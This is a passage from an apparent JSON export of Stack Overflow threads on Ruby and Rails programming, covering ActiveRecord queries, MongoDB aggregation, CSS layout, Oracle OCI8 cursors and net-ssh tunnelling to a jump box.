id, when parent has a field which is array of child ids", "body": "<pre><code>Estate.where(\"?= ANY(houses)\", house_id).ids\n</code></pre>\n\n<p>Note: where <strong>house_id</strong> can be your Search Criteria </p>\n"}], "owner": {"reputation": 5, "user_id": 10863157, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-5dMAqno0nr0/AAAAAAAAAAI/AAAAAAAAAAc/UZyEJXpY4BY/photo.jpg?sz=128", "display_name": "Sylvance", "link": "https://stackoverflow.com/users/10863157/sylvance"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 118, "favorite_count": 0, "accepted_answer_id": 56237036, "answer_count": 2, "score": 0, "last_activity_date": 1558437100, "creation_date": 1558397704, "question_id": 56229598, "link": "https://stackoverflow.com/questions/56229598/rails-activerecord-find-parent-given-child-model-id-when-parent-has-a-field-whi", "title": "Rails activerecord find parent given child model id, when parent has a field which is array of child ids", "body": "<p>some help please. I have an Activerecord object called Estate. Inside Estate, there is a field which is an array of ids for another Activerecord object called House.\nSo it looks something like this; <code>Estate ... houses: [an_array_of_house_ids]</code> while <code>House id:value ...</code>. House is its own thing with <strong>NO ASSOCIATION</strong> to Estate. Now if I have an arbitrary <code>house_id</code>, how can I query activerecord to get the Estate in which this house belongs to or if it does not belong to any Estate in my database?</p>\n\n<p>For example lets say the DB looks like this;</p>\n\n<pre><code>Estate\n_____________________________________________\n| estate_id   |    houses      |other_fileds|\n---------------------------------------------\n|       1     | [1, 2, 3, 4]   |      .     |\n---------------------------------------------\n|       2     | [5, 15, 3, 4] |      .     |\n---------------------------------------------\n|       3     | [6, 7, 8, 4] |      .     |\n---------------------------------------------\n\n# The houses fields has arrays of house_ids from the table below\n\nHouse\n_____________________________________________\n| house_id    | other_fileds|\n---------------------------------------------\n|       1     |       .     |\n---------------------------------------------\n|       2     |       .     |\n---------------------------------------------\n|       3     |       .     |\n---------------------------------------------\n</code></pre>\n\n<p>Given I have the house_id, let's say house_id=3, what would be the most optimal way to get the estate_id(s) for this house?</p>\n"}, {"tags": ["ruby"], "answers": [{"tags": [], "owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "is_accepted": true, "score": 3, "last_activity_date": 1558397548, "creation_date": 1558397548, "answer_id": 56229581, "question_id": 56229515, "link": "https://stackoverflow.com/questions/56229515/ruby-convert-hash-with-array-values-to-array-of-hashes/56229581#56229581", "title": "Ruby - Convert Hash with array values to array of hashes", "body": "<pre><code>aliases.flat_map { |k,v| v.map { |s| { k=&gt;s } } }\n  #=&gt; [{:blond=&gt;\"dark blond\"}, {:blond=&gt;\"dirty blond\"}, {:blond=&gt;\"honey blond\"},\n  #    {:blond=&gt;\"sandy blond\"}, {:blond=&gt;\"stawberry blond\"}, {:brown=&gt;\"dark brown\"},\n  #    {:brown=&gt;\"light brown\"}, {:gray=&gt;\"grey\"}] \n</code></pre>\n"}], "owner": {"reputation": 2495, "user_id": 1538101, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/586aa5393df4f5c6d2ba6b89a930c8e2?s=128&d=identicon&r=PG", "display_name": "Jeremie Ges", "link": "https://stackoverflow.com/users/1538101/jeremie-ges"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 32, "favorite_count": 0, "accepted_answer_id": 56229581, "answer_count": 1, "score": 0, "last_activity_date": 1558397548, "creation_date": 1558396758, "question_id": 56229515, "link": "https://stackoverflow.com/questions/56229515/ruby-convert-hash-with-array-values-to-array-of-hashes", "title": "Ruby - Convert Hash with array values to array of hashes", "body": "<p>Let's say I have this hash:</p>\n\n<pre><code>def aliases\n  {\n    blond: [\n      'dark blond',\n      'dirty blond',\n      'honey blond',\n      'sandy blond',\n      'stawberry blond'\n    ],\n    brown: [\n      'dark brown',\n      'light brown'\n    ],\n    gray: [\n      'grey'\n    ]\n  }\nend\n</code></pre>\n\n<p>What is the most elegant way to convert it to:</p>\n\n<pre><code>[ { blond: 'dark blond' }, { blond: 'dirty blond' }, { brown: 'dark brown' } ... ]\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "ruby-on-rails-5"], "answers": [{"comments": [{"owner": {"reputation": 1843, "user_id": 4067720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a52c645614505bcaeb65a6c5199158c1?s=128&d=identicon&r=PG", "display_name": "Glyoko", "link": "https://stackoverflow.com/users/4067720/glyoko"}, "edited": false, "score": 0, "creation_date": 1558397941, "post_id": 56229617, "comment_id": 99079056, "body": "Also, not strictly related to your question, but check out <a href=\"https://github.com/amerine/acts_as_tree\" rel=\"nofollow noreferrer\">github.com/amerine/acts_as_tree</a>. Great lib for dealing with tree structures like this."}, {"owner": {"reputation": 1843, "user_id": 4067720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a52c645614505bcaeb65a6c5199158c1?s=128&d=identicon&r=PG", "display_name": "Glyoko", "link": "https://stackoverflow.com/users/4067720/glyoko"}, "edited": false, "score": 0, "creation_date": 1558398262, "post_id": 56229617, "comment_id": 99079107, "body": "In fact, that lib gives you a method called <code>walk_tree</code> that seems to do exactly what you want, without having to implement this yourself."}, {"owner": {"reputation": 2960, "user_id": 7426461, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/Ldwxy.jpg?s=128&g=1", "display_name": "Cannon Moyer", "link": "https://stackoverflow.com/users/7426461/cannon-moyer"}, "edited": false, "score": 0, "creation_date": 1558440712, "post_id": 56229617, "comment_id": 99094728, "body": "This is perfect! Thanks!"}], "tags": [], "owner": {"reputation": 1843, "user_id": 4067720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a52c645614505bcaeb65a6c5199158c1?s=128&d=identicon&r=PG", "display_name": "Glyoko", "link": "https://stackoverflow.com/users/4067720/glyoko"}, "is_accepted": true, "score": 1, "last_activity_date": 1558397925, "creation_date": 1558397925, "answer_id": 56229617, "question_id": 56229463, "link": "https://stackoverflow.com/questions/56229463/print-folder-structure-from-activerecord-query/56229617#56229617", "title": "Print Folder Structure from ActiveRecord query", "body": "<p>You could make a partial that looks at each item and either 1) renders the item as a regular li item (if the item is a file) or 2) recursively renders itself (if the item is a directory).</p>\n\n<p>eg something like:</p>\n\n<pre><code># index.html.erb (or whatever your endpoint is, if not index)\n&lt;%= render partial: \"_entries.html.erb\", locals: {entries: @folders} %&gt;\n\n# _entries.html.erb\n&lt;ul&gt;\n  &lt;% entries.each do |item| %&gt;\n    &lt;li&gt;\n      &lt;% if item.is_directory? %&gt;\n        &lt;!-- rerender this partial with files in current directory --&gt;\n        &lt;%= render partial: \"_entries.html.erb\", locals: {entries: item.children} %&gt;\n      &lt;% else %&gt;\n        &lt;!-- render individual items --&gt;\n        &lt;%= item.name %&gt;\n      &lt;% end %&gt;\n    &lt;/li&gt;\n  &lt;% end %&gt;\n&lt;/ul&gt;\n</code></pre>\n\n<p>The ul's should end up nested exactly as deep as they should be.</p>\n"}], "owner": {"reputation": 2960, "user_id": 7426461, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/Ldwxy.jpg?s=128&g=1", "display_name": "Cannon Moyer", "link": "https://stackoverflow.com/users/7426461/cannon-moyer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 90, "favorite_count": 0, "accepted_answer_id": 56229617, "answer_count": 1, "score": 1, "last_activity_date": 1558397925, "creation_date": 1558396266, "question_id": 56229463, "link": "https://stackoverflow.com/questions/56229463/print-folder-structure-from-activerecord-query", "title": "Print Folder Structure from ActiveRecord query", "body": "<p>I have a single Model named Folder. The model has a foreign key that points back to the primary key of the table. I use this structure to create a virtual folder tree. </p>\n\n<p>My model looks like this:</p>\n\n<pre><code>class Folder\n     has_many :folders\n     belongs_to :folder, optional: true\nend\n</code></pre>\n\n<p>After I create a few folders that are related to each other, I essentially create a tree with N branches. I cannot remember how this is supposed to be parsed so that I can print out the HTML in my view that will show the actual folder structure.</p>\n\n<p>Essentially, my goal is to query for all folders that don't have a parent and work from there, like this.</p>\n\n<pre><code>@folders = Folder.all.where(folder_id: nil)\n</code></pre>\n\n<p>In my view</p>\n\n<pre><code>&lt;ul&gt;\n    &lt;% @folders.each do |i| %&gt;\n        &lt;li&gt;\n            &lt;%= i.name %&gt;\n             Somehow I need to grab the other child folders here and continue this process N times.\n        &lt;/li&gt;\n&lt;/ul&gt;\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "mongodb", "aggregate", "mongoid"], "answers": [{"tags": [], "owner": {"reputation": 21, "user_id": 11530785, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-3ddCBJ-bHgI/AAAAAAAAAAI/AAAAAAAAgaM/lMDtICmAi7s/photo.jpg?sz=128", "display_name": "Dmitry Bachinin", "link": "https://stackoverflow.com/users/11530785/dmitry-bachinin"}, "is_accepted": true, "score": 0, "last_activity_date": 1558433543, "creation_date": 1558433543, "answer_id": 56236022, "question_id": 56229432, "link": "https://stackoverflow.com/questions/56229432/how-to-find-ids-on-array-who-is-created-facet-operator/56236022#56236022", "title": "How to find ids on array who is created facet operator", "body": "<p>second expression in faced doesnt seen first expression\nneed delete</p>\n\n<pre><code>,\n                        \"data.self_customer_status_id\": {\n                            \"$in\": {\n                                \"$arrayElemAt\": \n                                [\n                                    \"$guests.array\", \n                                    0\n                                ]\n                            }  \n                        } \n</code></pre>\n\n<pre><code>    {\"$match\": {\"data.self_customer_status_id\": { \"$in\": [\"guests.array\"] } } }\n    ```\nthis link paste before $project\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 11530785, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-3ddCBJ-bHgI/AAAAAAAAAAI/AAAAAAAAgaM/lMDtICmAi7s/photo.jpg?sz=128", "display_name": "Dmitry Bachinin", "link": "https://stackoverflow.com/users/11530785/dmitry-bachinin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 70, "favorite_count": 0, "accepted_answer_id": 56236022, "answer_count": 1, "score": 2, "last_activity_date": 1558433543, "creation_date": 1558395908, "question_id": 56229432, "link": "https://stackoverflow.com/questions/56229432/how-to-find-ids-on-array-who-is-created-facet-operator", "title": "How to find ids on array who is created facet operator", "body": "<p>I have Customer collection on MongoDB. With status field. Which can have the same Id fields.\nAnd I need find first changed value like 'Guest' and push it Id's to specific pipeline named as 'guests'.\nAnd customers with status 'Member' I need push tu another pipeline named as 'members' who Id'd equal Id's from aggregation pipeline 'guests'.\nThis is done in order to obtain the quantity elements in 'guests' and 'members'.</p>\n\n<p>Its member item:</p>\n\n<pre><code>{\"_id\"=&gt;{\"$oid\"=&gt;\"5ce2ecb3ad71852e7fa9e73f\"},\n       \"status\"=&gt;\"member\",\n       \"duration\"=&gt;nil,\n       \"is_deleted\"=&gt;false,\n       \"customer_id\"=&gt;\"17601\",\n       \"customer_journal_item_id\"=&gt;\"62769\",\n       \"customer_ids\"=&gt;\"17601\",\n       \"customer_journal_item_ids\"=&gt;\"62769\",\n       \"self_customer_status_id\"=&gt;\"21078\",\n       \"self_customer_status_created_at\"=&gt;\"2017-02-01T00:00:00.000Z\",\n       \"self_customer_status_updated_at\"=&gt;\"2017-02-01T00:00:00.000Z\",\n       \"updated_at\"=&gt;\"2019-05-20T18:06:43.655Z\",\n       \"created_at\"=&gt;\"2019-05-20T18:06:43.655Z\"}}\n</code></pre>\n\n<p>My aggregation</p>\n\n<pre><code>    {\n        '$sort': {'self_customer_status_created_at': 1}\n    }, \n    {'$match': \n        {\n            'self_customer_status_created_at': \n            {\n                \"$gte\": Time.parse('2017-01-17').beginning_of_month, \n                \"$lte\": Time.parse('2017-01-17').end_of_month \n            }\n        } \n    }, \n    {\n        \"$facet\": {\n            \"guests\": \n            [ \n                { \n                    \"$group\": {\n                        \"_id\": \"$_id\", \n                        \"data\": {\n                            '$first': '$$ROOT'\n                        } \n                    } \n                }, \n                {\n                    \"$match\": {\n                        \"data.status\": \"guest\"\n                    }\n                }, {\n                    \"$group\": {\n                        \"_id\":nil, \n                        \"array\":{\n                            \"$push\": \"$data.self_customer_status_id\" \n                        } \n                    } \n                }, \n                { \n                    \"$project\":{\n                        \"array\": 1,\n                        \"_id\":0\n                    } \n                }\n            ], \"members\": \n            [ \n                { \n                    \"$group\": {\n                        \"_id\": \"$_id\", \"data\": {\n                            '$last': '$$ROOT'\n                        } \n                    } \n                }, \n                {\n                    \"$match\": {\n                        \"data.status\": \"member\",\n                        \"data.self_customer_status_id\": {\n                            \"$in\": [\n                                    \"$guests.array\"\n                                  ]\n                            }  \n                        } \n                    }\n                } \n            ] \n        } \n    }, {\n        \"$project\": \n        { \n            \"members\": 1, \n            \"guests.array\": 1 \n        } \n        } \n    ]\n).as_json\n</code></pre>\n\n<p>Instead \"guests.array\" array? I have error:\n<code>\nMongo::Error::OperationFailure: $in needs an array (2)\n</code></p>\n\n<p>What am I doing wrong?\nSorry my English!</p>\n"}, {"tags": ["html", "css", "ruby-on-rails", "ruby"], "answers": [{"comments": [{"owner": {"reputation": 45, "user_id": 11467874, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Zouoo.png?s=128&g=1", "display_name": "Portabello", "link": "https://stackoverflow.com/users/11467874/portabello"}, "edited": false, "score": 1, "creation_date": 1558454891, "post_id": 56229679, "comment_id": 99103447, "body": "Hey, thanks for the response! This worked flawlessly. Im going to read into flexbox, as I&#39;ve never used it before, but thank you very much for your answer and helpful example!"}], "tags": [], "owner": {"reputation": 2518, "user_id": 6080254, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/joqiB.jpg?s=128&g=1", "display_name": "Bruno Monteiro", "link": "https://stackoverflow.com/users/6080254/bruno-monteiro"}, "is_accepted": true, "score": 0, "last_activity_date": 1558398519, "creation_date": 1558398519, "answer_id": 56229679, "question_id": 56229383, "link": "https://stackoverflow.com/questions/56229383/fixing-the-header-sidebar-position-while-scrolling/56229679#56229679", "title": "Fixing the Header &amp; Sidebar position while Scrolling", "body": "<p>The easiest way is probably to use <strong>flexbox</strong>.</p>\n\n<p>I made an example for you here:</p>\n\n<pre><code>&lt;!DOCTYPE html&gt;\n    &lt;html&gt;\n      &lt;head&gt;\n      &lt;/head&gt;\n    &lt;body style=\"margin: 0\"&gt;\n      &lt;div style=\"height: 100vh; display: flex; flex-direction: column; overflow: hidden\"&gt;\n        &lt;!--top bar--&gt;\n        &lt;header class=\"main\" style=\"background-color: #aaa; padding: 5px;\"&gt;\n          &lt;button onclick=\"document.getElementById('sideBar').innerHTML = 'Bigger text that grows'\"&gt;Change side bar text&lt;/button&gt;\n        &lt;/header&gt;\n\n        &lt;section class=\"content\" style=\"display: flex;\"&gt;\n\n          &lt;!--side bar--&gt;\n          &lt;nav class=\"side_nav\" style=\"padding: 5px;\"&gt;\n            &lt;p style=\"background-color: #ccc; height: 300px;\" id=\"sideBar\"&gt;Side bar&lt;/p&gt;\n          &lt;/nav&gt;\n\n          &lt;!--actual content--&gt;\n          &lt;main class=' &lt;%= controller.controller_name %&gt; ' style=\"flex: 1; height: 100%; overflow: auto; padding: 5px;\"&gt;\n            &lt;p style=\"background-color: #eee; height: 300px;\"&gt;Main content&lt;/p&gt;\n            &lt;p style=\"background-color: #eee; height: 300px;\"&gt;Main content&lt;/p&gt;\n            &lt;p style=\"background-color: #eee; height: 300px;\"&gt;Main content&lt;/p&gt;\n            &lt;p style=\"background-color: #eee; height: 300px;\"&gt;Main content&lt;/p&gt;\n            &lt;p style=\"background-color: #eee; height: 300px;\"&gt;Main content&lt;/p&gt;\n\n          &lt;/main&gt;\n\n        &lt;/section&gt;\n      &lt;/div&gt;\n    &lt;/body&gt;\n  &lt;/html&gt;\n</code></pre>\n\n<p>Please note that you need to reset the <code>margin</code> of the <code>&lt;body&gt;</code>.</p>\n"}], "owner": {"reputation": 45, "user_id": 11467874, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Zouoo.png?s=128&g=1", "display_name": "Portabello", "link": "https://stackoverflow.com/users/11467874/portabello"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 60, "favorite_count": 0, "accepted_answer_id": 56229679, "answer_count": 1, "score": 1, "last_activity_date": 1558398519, "creation_date": 1558395215, "question_id": 56229383, "link": "https://stackoverflow.com/questions/56229383/fixing-the-header-sidebar-position-while-scrolling", "title": "Fixing the Header &amp; Sidebar position while Scrolling", "body": "<p>I have a Ruby on Rails project I am working on. I am encountering issues when trying to make a header and sidebar have a fixed position while scrolling down the page. I have experimented with the position:fixed; css attribute, and although this works (to some degree), it ruins the formatting of the rest of the page. First I will show my code so this makes more sense. This is the embedded ruby html file that acts as a storefront for my web application.</p>\n\n<p>application.html.erb</p>\n\n<pre class=\"lang-html prettyprint-override\"><code>&lt;header class=\"main\"&gt;\n      &lt;aside&gt;\n        &lt;%= form_tag store_index_path, class: 'locale' do %&gt;\n          &lt;%= select_tag 'set_locale',\n            options_for_select(LANGUAGES, I18n.locale.to_s),\n            onchange: 'this.form.submit()' %&gt;\n          &lt;%= submit_tag 'submit', id: \"submit_locale_change\" %&gt;\n        &lt;% end %&gt;\n      &lt;/aside&gt;\n        &lt;div class=\"header_obj\"&gt;&lt;%= image_tag 'logo.svg', alt: 'The Pragmatic Bookshelf' %&gt;&lt;/div&gt;\n        &lt;%= javascript_pack_tag(\"clock\") %&gt;\n        &lt;div class=\"header_obj\" id=\"clock-component\"&gt;&lt;/div&gt;\n      &lt;/div&gt;\n      &lt;h1&gt;&lt;%= @page_title %&gt;&lt;/h1&gt;\n    &lt;/header&gt;\n    &lt;section class=\"content\"&gt;\n      &lt;nav class=\"side_nav\"&gt;\n        &lt;% if @cart %&gt;\n          &lt;div id=\"cart\" class=\"carts\" &gt;\n            &lt;%= render_if @cart &amp;&amp; @cart.line_items.any?, @cart %&gt;\n          &lt;/div&gt;\n        &lt;% end %&gt;\n        &lt;ul&gt;\n          &lt;li&gt;&lt;a href=\"/\"&gt;&lt;%= t('.home') %&gt;&lt;/a&gt;&lt;/li&gt;\n          &lt;li&gt;&lt;a href=\"/questions\"&gt;&lt;%= t('.questions') %&gt;&lt;/a&gt;&lt;/li&gt;\n          &lt;li&gt;&lt;a href=\"/news\"&gt;&lt;%= t('.news') %&gt;&lt;/a&gt;&lt;/li&gt;\n          &lt;li&gt;&lt;a href=\"/contact\"&gt;&lt;%= t('.contact') %&gt;&lt;/a&gt;&lt;/li&gt;\n          &lt;% if session[:counter] &gt; 5 %&gt;\n            &lt;li&gt;count:&lt;%= session[:counter] %&gt;&lt;/li&gt;\n          &lt;% end %&gt;\n        &lt;/ul&gt;\n\n        &lt;% if session[:user_id] %&gt;\n          &lt;nav class=\"logged_in_nav\"&gt;\n            &lt;ul&gt;\n              &lt;li&gt;&lt;%= link_to 'Orders', orders_path %&gt;&lt;/li&gt;\n              &lt;li&gt;&lt;%= link_to 'Products', products_path %&gt;&lt;/li&gt;\n              &lt;li&gt;&lt;%= link_to 'Users', users_path %&gt;&lt;/li&gt;\n              &lt;li&gt;&lt;%= link_to 'Logout', logout_path, method: :delete %&gt;&lt;/li&gt;\n              &lt;li&gt;Users: &lt;%= $unique_users %&gt;&lt;/li&gt;\n            &lt;/ul&gt;\n          &lt;/nav&gt;\n          &lt;% else %&gt;\n          &lt;nav class=\"logged_out_nav\"&gt;\n            &lt;ul&gt;\n              &lt;li&gt;&lt;%= link_to 'Login', login_path %&gt;&lt;/li&gt;\n              &lt;li&gt;Users: &lt;%= $unique_users %&gt;&lt;/li&gt;\n            &lt;/ul&gt;\n          &lt;/nav&gt;\n        &lt;% end %&gt;\n      &lt;/nav&gt;\n    &lt;main class=' &lt;%= controller.controller_name %&gt; '&gt;\n      &lt;%= yield %&gt;\n    &lt;/main&gt;\n    &lt;/section&gt;\n</code></pre>\n\n<p>This file has a header bar wrapped in a (header class=\"main\") as well as a side bar wrapped within (nav class=\"side_nav\") then the actual page content within the erb code (main class=' (%= controller.controller_name %) ') to show the structure of the page a little better, see the following guide...</p>\n\n<pre class=\"lang-html prettyprint-override\"><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n\n    &lt;!--top bar--&gt;\n    &lt;header class=\"main\"&gt;\n    &lt;/header&gt;\n\n    &lt;section class=\"content\"&gt;\n\n      &lt;!--side bar--&gt;\n      &lt;nav class=\"side_nav\"&gt;\n      &lt;/nav&gt;\n\n      &lt;!--actual content--&gt;\n      &lt;main class=' &lt;%= controller.controller_name %&gt; '&gt;\n      &lt;/main&gt;\n\n    &lt;/section&gt;\n\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>As far as the css file goes, there is not much there aside from margin, padding, and font styling there, its rather large so I wont include it here. I dont think anything in there would impede a solution to this issue.</p>\n\n<p>My goal is to have the top and side bar stay fixed while the user scrolls through the content of the page. When i tried using position:fixed, the issue was the content would go behind the side bar. I was able to resolve this issue by adding padding to the content, but another issue arose since the side bar is not always a fixed size, when a user clicks certain buttons the side bar may expand in width or contract, so adding a fixed padding was not a good solution. Is there any way I can achieve this, maybe through JS? Kinda lost here, Any help is appreciated :)</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "oracle", "oracle11g", "oci8"], "answers": [{"tags": [], "owner": {"reputation": 38137, "user_id": 5841306, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wwk1C.jpg?s=128&g=1", "display_name": "Barbaros &#214;zhan", "link": "https://stackoverflow.com/users/5841306/barbaros-%c3%96zhan"}, "is_accepted": true, "score": 1, "last_activity_date": 1558450379, "last_edit_date": 1558450379, "creation_date": 1558408410, "answer_id": 56230586, "question_id": 56229363, "link": "https://stackoverflow.com/questions/56229363/ruby-oci8-call-funtion-with-rowtype-not-working/56230586#56230586", "title": "Ruby - Oci8 - Call funtion with rowtype not working", "body": "<p>Replacing <code>cursor.bind_param(':ret', nil, OCI8::RAW)</code> </p>\n\n<p>with \n      <code>cursor.bind_param(':ret', OCI8::Cursor)</code> would do the trick, </p>\n\n<p>but you need to convert your function to </p>\n\n<pre><code>CREATE OR REPLACE FUNCTION MY_FUNCTION (MY_ID IN VARCHAR2) RETURN sys_refcursor AS \n    res sys_refcursor; \nBEGIN  \n    open res for\n      select *\n        from vendedor\n          where id = MY_ID;    \n    return res;  \nEND MY_FUNCTION;\n</code></pre>\n\n<p>to prepare to return <code>sys_refcursor</code> type</p>\n\n<p>For get the result in ruby code:</p>\n\n<pre><code>result = cursor[':ret']\nwhile r = result.fetch_hash\n    retFinal = r\nend\n</code></pre>\n\n<p>retFinal variable has the cursor's last result </p>\n"}], "owner": {"reputation": 742, "user_id": 2871845, "user_type": "registered", "accept_rate": 48, "profile_image": "https://i.stack.imgur.com/7bFOd.png?s=128&g=1", "display_name": "victorpacheco3107", "link": "https://stackoverflow.com/users/2871845/victorpacheco3107"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 66, "favorite_count": 0, "accepted_answer_id": 56230586, "answer_count": 1, "score": 1, "last_activity_date": 1558450379, "creation_date": 1558395013, "last_edit_date": 1558419726, "question_id": 56229363, "link": "https://stackoverflow.com/questions/56229363/ruby-oci8-call-funtion-with-rowtype-not-working", "title": "Ruby - Oci8 - Call funtion with rowtype not working", "body": "<p>I have an oracle function like this:</p>\n\n<pre><code>CREATE OR REPLACE FUNCTION MY_FUNCTION (MY_ID IN VARCHAR2) \nRETURN vendedor%rowtype AS \n    res vendedor%rowtype; \nBEGIN  \n    select * into res\n    from vendedor\n    where id = MY_ID;    \n    return res;  \nEND MY_FUNCTION;\n</code></pre>\n\n<p>And I want to call this function from my ruby code using <code>oci8 gem</code>. This is my ruby code:</p>\n\n<pre><code>connectString = ENV['DB_CONNECTION']\nconn = OCI8.new(connectString)\ncursor = conn.parse ('begin :ret := MY_FUNCTION(:MY_ID); end;') \ncursor.bind_param(':MY_ID', '123', String)\ncursor.bind_param(':ret', nil, OCI8::RAW) # This is the question\ncursor.exec()\nresult = cursor[':ret']\ncursor.close\nconn.logoff\n</code></pre>\n\n<p>What is the parameter's bind type of <code>:ret</code> variable?</p>\n\n<p>To execute this code throw this error:</p>\n\n<pre><code>ORA-06550: line 1, column 15: PLS-00382: expression is of wrong type ORA-06550: line 1, \ncolumn 7: PL/SQL: Statement ignored\n</code></pre>\n"}, {"tags": ["ruby", "rest-client", "ssh-tunnel", "net-ssh"], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 4572828, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-xv0H-DsQNwk/AAAAAAAAAAI/AAAAAAAAADo/uUbZWj_wlJc/photo.jpg?sz=128", "display_name": "Gary Golub", "link": "https://stackoverflow.com/users/4572828/gary-golub"}, "edited": false, "score": 0, "creation_date": 1559578930, "post_id": 56385213, "comment_id": 99456787, "body": "Thanks for the suggestion but, unfortunately, that defeats the purpose.  I&#39;m trying to use ruby, not a bunch of external programs.  I can already use &#39;ssh&#39; externally, as shown in the sample code, and that works w/o introducing curl.  I want just ruby (ignoring whatever the gems are doing that might require C, etc.)."}], "tags": [], "owner": {"reputation": 136, "user_id": 104055, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/601fb9606dd1479c15261c460625590a?s=128&d=identicon&r=PG", "display_name": "delano", "link": "https://stackoverflow.com/users/104055/delano"}, "is_accepted": false, "score": 0, "last_activity_date": 1559248170, "creation_date": 1559248170, "answer_id": 56385213, "question_id": 56228836, "link": "https://stackoverflow.com/questions/56228836/how-do-i-configure-net-ssh-so-i-can-fetch-data-using-rest-client-through-an-ssh/56385213#56385213", "title": "How do I configure net-ssh so I can fetch data using rest-client through an ssh tunnel?", "body": "<p>I suspect it's related to the port forwarding. Inside that block you should be able to access <code>elasticUrl:9200</code> since you're essentially on the jumphost at that point. </p>\n\n<p>My suggestion would be to ssh into the jumphost and <code>curl</code> the API endpoint as test. If that works, you should be able to copy that command verbatim and pass it to <code>session.exec!</code>. And finally if that works, then you should be able to update <code>fetchData</code> to make the request to <code>elasticUrl:9200</code> and you're off to the races.</p>\n"}], "owner": {"reputation": 21, "user_id": 4572828, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-xv0H-DsQNwk/AAAAAAAAAAI/AAAAAAAAADo/uUbZWj_wlJc/photo.jpg?sz=128", "display_name": "Gary Golub", "link": "https://stackoverflow.com/users/4572828/gary-golub"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 54, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1559248170, "creation_date": 1558390527, "question_id": 56228836, "link": "https://stackoverflow.com/questions/56228836/how-do-i-configure-net-ssh-so-i-can-fetch-data-using-rest-client-through-an-ssh", "title": "How do I configure net-ssh so I can fetch data using rest-client through an ssh tunnel?", "body": "<p>We have an elasticsearch setup that is only available from a jump box.  I want to set up an ssh tunnel so I can query from my laptop or a Docker container.\nWhen I run ssh, either directly or via 'system' the tunnel works and my post fetches data.  When I try to set up the tunnel using net-ssh I get a RestClient::Exceptions::ReadTimeout.  I'm not sure what I'm missing in the net-ssh configuration.  I've provided a simplified code example.</p>\n\n<p>Tried running this on Windows with Cygwin, and in a Docker container running Centos7.</p>\n\n<pre><code>require 'json'\nrequire 'net/ssh'\nrequire 'rest-client'\n\ndef fetchData\n  indexName = \"REDACTED\"\n  url = \"http://localhost:9999/#{indexName}/_search?pretty\"\n  body = '{\"size\":1, \"query\":{\"match_all\":{}}}'\n  resp = RestClient.post url, body, :content_type =&gt; :json, :accept =&gt; :json\n  return JSON.parse(resp)\nend\n\nbegin\n  userName   = 'REDACTED'\n  privateKey = 'id_rsa'\n  jumpBoxUrl = 'REDACTED.com'\n  elasticUrl = 'REDACTED.com'\n\n  # this works\n  system(\"ssh -fN -o StrictHostKeyChecking=no -i ~/.ssh/#{privateKey} #{userName}@#{jumpBoxUrl} -p 22 -L 9999:#{elasticUrl}:9200 sleep 10 &gt;&gt; logfile\")\n  puts fetchData\n\n  # wait for the ssh to time out\n  sleep 5\n\n  # Timed out reading data from server (RestClient::Exceptions::ReadTimeout) - WHY?!\n  #\n  Net::SSH.start(jumpBoxUrl, userName, :port=&gt;22, :forward_agent=&gt;true, :verbose=&gt;:info, :keys=&gt;[\"~/.ssh/#{privateKey}\"]) do |session|\n    session.forward.local(9999, elasticUrl, 9200)\n\n    # this works - able to authenticate to the shell box\n    puts session.exec!(\"ls -la\")\n\n    # this times out - data is not returned\n    puts fetchData\n  end\nend\n</code></pre>\n\n<p>I expect the post to return the same data when using net-ssh as it does when using ssh.</p>\n\n<p>Appreciate any help with what I'm missing in my net-ssh setup.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "heroku", "rubygems", "bundler"], "comments": [{"owner": {"reputation": 3902, "user_id": 10608621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d59df09a85d05117c63706f66811b70c?s=128&d=identicon&r=PG", "display_name": "mechnicov", "link": "https://stackoverflow.com/users/10608621/mechnicov"}, "edited": false, "score": 0, "creation_date": 1558385181, "post_id": 56227085, "comment_id": 99076169, "body": "How looks your <code>Gemfile.lock</code> (<code>BUNDLED WITH</code>)?"}, {"owner": {"reputation": 597, "user_id": 10239403, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44fbdaea0dedd13b281fb7e70665efe4?s=128&d=identicon&r=PG", "display_name": "Demian 